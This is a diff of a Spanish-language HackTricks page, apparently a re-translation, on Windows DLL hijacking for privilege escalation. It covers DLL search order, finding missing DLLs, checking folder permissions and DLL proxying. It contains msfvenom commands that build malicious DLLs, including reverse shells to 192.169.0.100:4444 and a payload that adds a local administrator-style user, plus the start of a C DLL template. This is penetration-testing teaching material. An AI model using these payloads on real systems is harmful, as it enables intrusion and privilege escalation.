@@ -1,115 +1,117 @@
-# Secuestro de DLL
+# Dll Hijacking
+
+{% hint style="success" %}
+Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
 
 <details>
 
-<summary><strong>Aprende a hackear AWS desde cero hasta convertirte en un experto con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Support HackTricks</summary>
 
-Otras formas de apoyar a HackTricks:
-
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, ¡Consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén la [**merchandising oficial de PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) en GitHub.
+* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
+* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.
 
 </details>
+{% endhint %}
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Consejo de recompensa por errores**: **Regístrate** en **Intigriti**, una plataforma premium de **recompensas por errores creada por hackers, para hackers**. ¡Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy y comienza a ganar recompensas de hasta **$100,000**!
+**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
-## Información Básica
+## Basic Information
 
-El secuestro de DLL implica manipular una aplicación de confianza para cargar una DLL maliciosa. Este término abarca varias tácticas como **Suplantación, Inyección y Carga Lateral de DLL**. Se utiliza principalmente para ejecución de código, lograr persistencia y, menos comúnmente, escalada de privilegios. A pesar del enfoque en la escalada aquí, el método de secuestro sigue siendo consistente en todos los objetivos.
+El DLL Hijacking implica manipular una aplicación de confianza para cargar un DLL malicioso. Este término abarca varias tácticas como **DLL Spoofing, Injection, y Side-Loading**. Se utiliza principalmente para la ejecución de código, logrando persistencia y, menos comúnmente, escalada de privilegios. A pesar del enfoque en la escalada aquí, el método de secuestro sigue siendo consistente a través de los objetivos.
 
-### Técnicas Comunes
+### Common Techniques
 
-Se emplean varios métodos para el secuestro de DLL, cada uno con su efectividad dependiendo de la estrategia de carga de DLL de la aplicación:
+Se emplean varios métodos para el DLL hijacking, cada uno con su efectividad dependiendo de la estrategia de carga de DLL de la aplicación:
 
-1. **Reemplazo de DLL**: Intercambiar una DLL genuina por una maliciosa, opcionalmente utilizando Proxy DLL para preservar la funcionalidad de la DLL original.
-2. **Secuestro del Orden de Búsqueda de DLL**: Colocar la DLL maliciosa en una ruta de búsqueda antes que la legítima, explotando el patrón de búsqueda de la aplicación.
-3. **Secuestro de DLL Fantasma**: Crear una DLL maliciosa para que una aplicación la cargue, pensando que es una DLL requerida inexistente.
-4. **Redirección de DLL**: Modificar parámetros de búsqueda como `%PATH%` o archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación a la DLL maliciosa.
-5. **Reemplazo de DLL WinSxS**: Sustituir la DLL legítima por una maliciosa en el directorio WinSxS, un método a menudo asociado con la carga lateral de DLL.
-6. **Secuestro de DLL de Ruta Relativa**: Colocar la DLL maliciosa en un directorio controlado por el usuario con la aplicación copiada, similar a las técnicas de Ejecución de Proxy Binario.
+1. **Reemplazo de DLL**: Intercambiar un DLL genuino por uno malicioso, utilizando opcionalmente el DLL Proxying para preservar la funcionalidad del DLL original.
+2. **Secuestro del Orden de Búsqueda de DLL**: Colocar el DLL malicioso en una ruta de búsqueda antes del legítimo, explotando el patrón de búsqueda de la aplicación.
+3. **Secuestro de DLL Fantasma**: Crear un DLL malicioso para que una aplicación lo cargue, pensando que es un DLL requerido que no existe.
+4. **Redirección de DLL**: Modificar parámetros de búsqueda como `%PATH%` o archivos `.exe.manifest` / `.exe.local` para dirigir la aplicación al DLL malicioso.
+5. **Reemplazo de DLL en WinSxS**: Sustituir el DLL legítimo por un contraparte malicioso en el directorio WinSxS, un método a menudo asociado con el side-loading de DLL.
+6. **Secuestro de DLL con Ruta Relativa**: Colocar el DLL malicioso en un directorio controlado por el usuario con la aplicación copiada, pareciendo técnicas de Ejecución de Proxy Binario.
 
-## Encontrar Dlls faltantes
+## Finding missing Dlls
 
-La forma más común de encontrar Dlls faltantes dentro de un sistema es ejecutar [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:
+La forma más común de encontrar DLLs faltantes dentro de un sistema es ejecutando [procmon](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) de sysinternals, **configurando** los **siguientes 2 filtros**:
 
 ![](<../../.gitbook/assets/image (311).png>)
 
 ![](<../../.gitbook/assets/image (313).png>)
 
-y mostrar solo la **Actividad del Sistema de Archivos**:
+y solo mostrar la **Actividad del Sistema de Archivos**:
 
 ![](<../../.gitbook/assets/image (314).png>)
 
-Si estás buscando **dlls faltantes en general**, déjalo ejecutándose durante algunos **segundos**.\
-Si estás buscando una **dll faltante dentro de un ejecutable específico**, debes configurar **otro filtro como "Nombre del Proceso" "contiene" "\<nombre del ejecutable>", ejecutarlo y detener la captura de eventos**.
+Si estás buscando **dlls faltantes en general** debes **dejar** esto funcionando por algunos **segundos**.\
+Si estás buscando un **dll faltante dentro de un ejecutable específico** deberías establecer **otro filtro como "Nombre del Proceso" "contiene" "\<nombre del ejecutable>", ejecutarlo y detener la captura de eventos**.
 
-## Explotando Dlls Faltantes
+## Exploiting Missing Dlls
 
-Para escalar privilegios, la mejor oportunidad que tenemos es poder **escribir una dll que un proceso privilegiado intentará cargar** en algún **lugar donde se va a buscar**. Por lo tanto, podremos **escribir** una dll en una **carpeta** donde la **dll se busca antes** que la carpeta donde está la **dll original** (caso extraño), o podremos **escribir en alguna carpeta donde se buscará la dll** y la **dll original no exista** en ninguna carpeta.
+Para escalar privilegios, la mejor oportunidad que tenemos es poder **escribir un dll que un proceso privilegiado intentará cargar** en alguno de **los lugares donde se va a buscar**. Por lo tanto, podremos **escribir** un dll en una **carpeta** donde el **dll se busca antes** de la carpeta donde se encuentra el **dll original** (caso extraño), o podremos **escribir en alguna carpeta donde se va a buscar el dll** y el **dll original no existe** en ninguna carpeta.
 
-### Orden de Búsqueda de Dll
+### Dll Search Order
 
-**Dentro de la** [**documentación de Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puedes encontrar cómo se cargan específicamente las Dlls**.
+**Dentro de la** [**documentación de Microsoft**](https://docs.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order#factors-that-affect-searching) **puedes encontrar cómo se cargan específicamente los DLLs.**
 
-Las aplicaciones de **Windows** buscan DLLs siguiendo un conjunto de **rutas de búsqueda predefinidas**, siguiendo una secuencia particular. El problema del secuestro de DLL surge cuando se coloca estratégicamente una DLL dañina en uno de estos directorios, asegurando que se cargue antes que la DLL auténtica. Una solución para prevenir esto es asegurarse de que la aplicación utilice rutas absolutas al referirse a las DLL que requiere.
+**Las aplicaciones de Windows** buscan DLLs siguiendo un conjunto de **rutas de búsqueda predefinidas**, adhiriéndose a una secuencia particular. El problema del DLL hijacking surge cuando un DLL dañino se coloca estratégicamente en uno de estos directorios, asegurando que se cargue antes que el DLL auténtico. Una solución para prevenir esto es asegurarse de que la aplicación utilice rutas absolutas al referirse a los DLLs que requiere.
 
 Puedes ver el **orden de búsqueda de DLL en sistemas de 32 bits** a continuación:
 
 1. El directorio desde el cual se cargó la aplicación.
 2. El directorio del sistema. Usa la función [**GetSystemDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getsystemdirectorya) para obtener la ruta de este directorio.(_C:\Windows\System32_)
-3. El directorio del sistema de 16 bits. No hay una función que obtenga la ruta de este directorio, pero se busca. (_C:\Windows\System_)
+3. El directorio del sistema de 16 bits. No hay función que obtenga la ruta de este directorio, pero se busca. (_C:\Windows\System_)
 4. El directorio de Windows. Usa la función [**GetWindowsDirectory**](https://docs.microsoft.com/en-us/windows/desktop/api/sysinfoapi/nf-sysinfoapi-getwindowsdirectorya) para obtener la ruta de este directorio.
 1. (_C:\Windows_)
 5. El directorio actual.
-6. Los directorios que se enumeran en la variable de entorno PATH. Ten en cuenta que esto no incluye la ruta por aplicación especificada por la clave del registro **App Paths**. La clave **App Paths** no se utiliza al calcular la ruta de búsqueda de DLL.
+6. Los directorios que están listados en la variable de entorno PATH. Ten en cuenta que esto no incluye la ruta por aplicación especificada por la clave de registro **App Paths**. La clave **App Paths** no se utiliza al calcular la ruta de búsqueda de DLL.
 
-Ese es el **orden de búsqueda predeterminado** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual asciende al segundo lugar. Para deshabilitar esta función, crea el valor del registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y configúralo en 0 (predeterminado habilitado).
+Ese es el **orden de búsqueda predeterminado** con **SafeDllSearchMode** habilitado. Cuando está deshabilitado, el directorio actual asciende al segundo lugar. Para deshabilitar esta función, crea el valor de registro **HKEY\_LOCAL\_MACHINE\System\CurrentControlSet\Control\Session Manager**\\**SafeDllSearchMode** y configúralo en 0 (el valor predeterminado está habilitado).
 
-Si se llama a la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) con **LOAD\_WITH\_ALTERED\_SEARCH\_PATH** la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.
+Si se llama a la función [**LoadLibraryEx**](https://docs.microsoft.com/en-us/windows/desktop/api/LibLoaderAPI/nf-libloaderapi-loadlibraryexa) con **LOAD\_WITH\_ALTERED\_SEARCH\_PATH**, la búsqueda comienza en el directorio del módulo ejecutable que **LoadLibraryEx** está cargando.
 
-Finalmente, ten en cuenta que **una dll podría cargarse indicando la ruta absoluta en lugar del nombre solamente**. En ese caso, esa dll **solo se buscará en esa ruta** (si la dll tiene dependencias, se buscarán como si se hubieran cargado solo por nombre).
+Finalmente, ten en cuenta que **un dll podría ser cargado indicando la ruta absoluta en lugar de solo el nombre**. En ese caso, ese dll **solo se buscará en esa ruta** (si el dll tiene alguna dependencia, se buscarán como si se cargaran solo por nombre).
 
-Existen otras formas de alterar el orden de búsqueda pero no las explicaré aquí.
-#### Excepciones en el orden de búsqueda de DLL según la documentación de Windows
+Hay otras formas de alterar el orden de búsqueda, pero no voy a explicarlas aquí.
 
-Se señalan ciertas excepciones al orden estándar de búsqueda de DLL en la documentación de Windows:
+#### Exceptions on dll search order from Windows docs
 
-- Cuando se encuentra una **DLL que comparte su nombre con una ya cargada en memoria**, el sistema omite la búsqueda habitual. En su lugar, realiza una verificación de redirección y un manifiesto antes de recurrir a la DLL ya cargada en memoria. **En este escenario, el sistema no realiza una búsqueda de la DLL**.
-- En casos en los que la DLL es reconocida como una **DLL conocida** para la versión actual de Windows, el sistema utilizará su versión de la DLL conocida, junto con cualquiera de sus DLL dependientes, **omitir el proceso de búsqueda**. La clave del registro **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estas DLL conocidas.
-- Si una **DLL tiene dependencias**, la búsqueda de estas DLL dependientes se realiza como si solo estuvieran indicadas por sus **nombres de módulo**, independientemente de si la DLL inicial fue identificada a través de una ruta completa.
+Ciertas excepciones al orden de búsqueda estándar de DLL se anotan en la documentación de Windows:
 
-### Escalando Privilegios
+* Cuando se encuentra un **DLL que comparte su nombre con uno ya cargado en memoria**, el sistema omite la búsqueda habitual. En su lugar, realiza una verificación de redirección y un manifiesto antes de recurrir al DLL ya en memoria. **En este escenario, el sistema no realiza una búsqueda del DLL**.
+* En casos donde el DLL es reconocido como un **DLL conocido** para la versión actual de Windows, el sistema utilizará su versión del DLL conocido, junto con cualquiera de sus DLLs dependientes, **omitindo el proceso de búsqueda**. La clave de registro **HKEY\_LOCAL\_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs** contiene una lista de estos DLLs conocidos.
+* Si un **DLL tiene dependencias**, la búsqueda de estos DLLs dependientes se realiza como si se indicaran solo por sus **nombres de módulo**, independientemente de si el DLL inicial se identificó a través de una ruta completa.
+
+### Escalating Privileges
 
 **Requisitos**:
 
-- Identificar un proceso que opere o vaya a operar bajo **diferentes privilegios** (movimiento horizontal o lateral), que **carezca de una DLL**.
-- Asegurarse de que haya **permisos de escritura** disponibles para cualquier **directorio** en el que se **busque la DLL**. Esta ubicación podría ser el directorio del ejecutable o un directorio dentro de la ruta del sistema.
+* Identificar un proceso que opera o operará bajo **diferentes privilegios** (movimiento horizontal o lateral), que **carece de un DLL**.
+* Asegurarse de que hay **acceso de escritura** disponible para cualquier **directorio** en el que se **buscará el DLL**. Esta ubicación podría ser el directorio del ejecutable o un directorio dentro de la ruta del sistema.
 
-Sí, los requisitos son complicados de encontrar ya que **por defecto es un poco extraño encontrar un ejecutable privilegiado que falte a una DLL** e incluso es **más extraño tener permisos de escritura en una carpeta de la ruta del sistema** (por defecto no se puede). Pero, en entornos mal configurados esto es posible.\
-En caso de tener suerte y cumplir con los requisitos, podrías revisar el proyecto [UACME](https://github.com/hfiref0x/UACME). Aunque el **objetivo principal del proyecto es eludir el UAC**, podrías encontrar allí un **PoC** de un secuestro de DLL para la versión de Windows que estás utilizando (probablemente solo cambiando la ruta de la carpeta donde tienes permisos de escritura).
+Sí, los requisitos son complicados de encontrar ya que **por defecto es un poco extraño encontrar un ejecutable privilegiado que falte un dll** y es aún **más extraño tener permisos de escritura en una carpeta de ruta del sistema** (no puedes por defecto). Pero, en entornos mal configurados esto es posible.\
+En el caso de que tengas suerte y te encuentres cumpliendo con los requisitos, podrías revisar el proyecto [UACME](https://github.com/hfiref0x/UACME). Aunque el **objetivo principal del proyecto es eludir UAC**, puedes encontrar allí un **PoC** de un Dll hijacking para la versión de Windows que puedes usar (probablemente solo cambiando la ruta de la carpeta donde tienes permisos de escritura).
 
-Ten en cuenta que puedes **verificar tus permisos en una carpeta** con:
+Ten en cuenta que puedes **verificar tus permisos en una carpeta** haciendo:
 ```bash
 accesschk.exe -dqv "C:\Python27"
 icacls "C:\Python27"
 ```
-Y **verificar los permisos de todas las carpetas dentro de la RUTA**:
+Y **verifica los permisos de todas las carpetas dentro de PATH**:
 ```bash
 for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
 ```
-También puedes verificar las importaciones de un ejecutable y las exportaciones de un dll con:
+Puedes también verificar las importaciones de un ejecutable y las exportaciones de un dll con:
 ```c
 dumpbin /imports C:\path\Tools\putty\Putty.exe
 dumpbin /export /path/file.dll
 ```
-Para obtener una guía completa sobre cómo **abusar del secuestro de Dll para escalar privilegios** con permisos para escribir en una carpeta de **Ruta del Sistema**, consulta:
+Para una guía completa sobre cómo **abusar de Dll Hijacking para escalar privilegios** con permisos para escribir en una **carpeta de ruta del sistema**, consulta:
 
 {% content-ref url="dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md" %}
 [writable-sys-path-+dll-hijacking-privesc.md](dll-hijacking/writable-sys-path-+dll-hijacking-privesc.md)
@@ -117,25 +119,25 @@ Para obtener una guía completa sobre cómo **abusar del secuestro de Dll para e
 
 ### Herramientas automatizadas
 
-[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)comprobará si tienes permisos de escritura en alguna carpeta dentro de la Ruta del Sistema.\
-Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las funciones de **PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll._
+[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS) verificará si tienes permisos de escritura en cualquier carpeta dentro de la ruta del sistema.\
+Otras herramientas automatizadas interesantes para descubrir esta vulnerabilidad son las **funciones de PowerSploit**: _Find-ProcessDLLHijack_, _Find-PathDLLHijack_ y _Write-HijackDll._
 
 ### Ejemplo
 
-En caso de encontrar un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear una dll que exporte al menos todas las funciones que el ejecutable importará de ella**. De todos modos, ten en cuenta que el secuestro de Dll es útil para [escalar desde el nivel de Integridad Medio a Alto **(burlando el UAC)**](../authentication-credentials-uac-and-efs.md#uac) o desde **Alto Integridad a SISTEMA**. Puedes encontrar un ejemplo de **cómo crear una dll válida** dentro de este estudio de secuestro de Dll centrado en el secuestro de Dll para ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
-Además, en la **siguiente sección** puedes encontrar algunos **códigos dll básicos** que podrían ser útiles como **plantillas** o para crear una **dll con funciones no requeridas exportadas**.
+En caso de que encuentres un escenario explotable, una de las cosas más importantes para explotarlo con éxito sería **crear un dll que exporte al menos todas las funciones que el ejecutable importará de él**. De todos modos, ten en cuenta que Dll Hijacking es útil para [escalar de nivel de integridad medio a alto **(eludiendo UAC)**](../authentication-credentials-uac-and-efs.md#uac) o de [**alta integridad a SYSTEM**](./#from-high-integrity-to-system)**.** Puedes encontrar un ejemplo de **cómo crear un dll válido** dentro de este estudio de dll hijacking enfocado en dll hijacking para ejecución: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
+Además, en la **siguiente sección** puedes encontrar algunos **códigos dll básicos** que podrían ser útiles como **plantillas** o para crear un **dll con funciones no requeridas exportadas**.
 
-## **Creación y compilación de Dlls**
+## **Creando y compilando Dlls**
 
 ### **Proxificación de Dll**
 
-Básicamente, un **proxy de Dll** es una Dll capaz de **ejecutar tu código malicioso al cargarse**, pero también de **exponer** y **funcionar** como **se espera** al **retransmitir todas las llamadas a la biblioteca real**.
+Básicamente, un **proxy de Dll** es un Dll capaz de **ejecutar tu código malicioso cuando se carga**, pero también de **exponer** y **funcionar** como **se esperaba** al **redirigir todas las llamadas a la biblioteca real**.
 
-Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes **indicar un ejecutable y seleccionar la biblioteca** que deseas proxificar y **generar una dll proxificada** o **indicar la Dll** y **generar una dll proxificada**.
+Con la herramienta [**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) o [**Spartacus**](https://github.com/Accenture/Spartacus) puedes **indicar un ejecutable y seleccionar la biblioteca** que deseas proxificar y **generar un dll proxificado** o **indicar el Dll** y **generar un dll proxificado**.
 
 ### **Meterpreter**
 
-**Obtener shell inversa (x64):**
+**Obtener rev shell (x64):**
 ```bash
 msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
@@ -143,13 +145,13 @@ msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll 
 ```bash
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
 ```
-**Crear un usuario (no vi una versión x64):**
+**Crear un usuario (x86 no vi una versión x64):**
 ```
 msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
 ```
 ### Tu propio
 
-Ten en cuenta que en varios casos, la Dll que compilas debe **exportar varias funciones** que serán cargadas por el proceso víctima, si estas funciones no existen, el **binario no podrá cargarlas** y el **exploit fallará**.
+Ten en cuenta que en varios casos el Dll que compiles debe **exportar varias funciones** que van a ser cargadas por el proceso víctima; si estas funciones no existen, el **binario no podrá cargarlas** y el **exploit fallará**.
 ```c
 // Tested in Win10
 // i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
@@ -237,20 +239,21 @@ return TRUE;
 
 <figure><img src="../../.gitbook/assets/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Consejo de recompensa por errores**: **Regístrate** en **Intigriti**, una plataforma de **recompensas por errores premium creada por hackers, para hackers**. ¡Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy y comienza a ganar recompensas de hasta **$100,000**!
+**Consejo de recompensas por errores**: **regístrate** en **Intigriti**, una **plataforma de recompensas por errores premium creada por hackers, para hackers**! Únete a nosotros en [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) hoy, y comienza a ganar recompensas de hasta **$100,000**!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
+{% hint style="success" %}
+Aprende y practica Hacking en AWS:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
+Aprende y practica Hacking en GCP: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)
+
 <details>
 
-<summary><strong>Aprende hacking en AWS de cero a héroe con</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary>Apoya a HackTricks</summary>
 
-Otras formas de apoyar a HackTricks:
-
-* Si deseas ver tu **empresa anunciada en HackTricks** o **descargar HackTricks en PDF**, consulta los [**PLANES DE SUSCRIPCIÓN**](https://github.com/sponsors/carlospolop)!
-* Obtén el [**oficial PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Descubre [**The PEASS Family**](https://opensea.io/collection/the-peass-family), nuestra colección exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
-* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
-* **Comparte tus trucos de hacking enviando PRs a los repositorios de** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Revisa los [**planes de suscripción**](https://github.com/sponsors/carlospolop)!
+* **Únete al** 💬 [**grupo de Discord**](https://discord.gg/hRep4RUj7f) o al [**grupo de telegram**](https://t.me/peass) o **síguenos** en **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
+* **Comparte trucos de hacking enviando PRs a los** [**HackTricks**](https://github.com/carlospolop/hacktricks) y [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositorios de github.
 
 </details>
+{% endhint %}
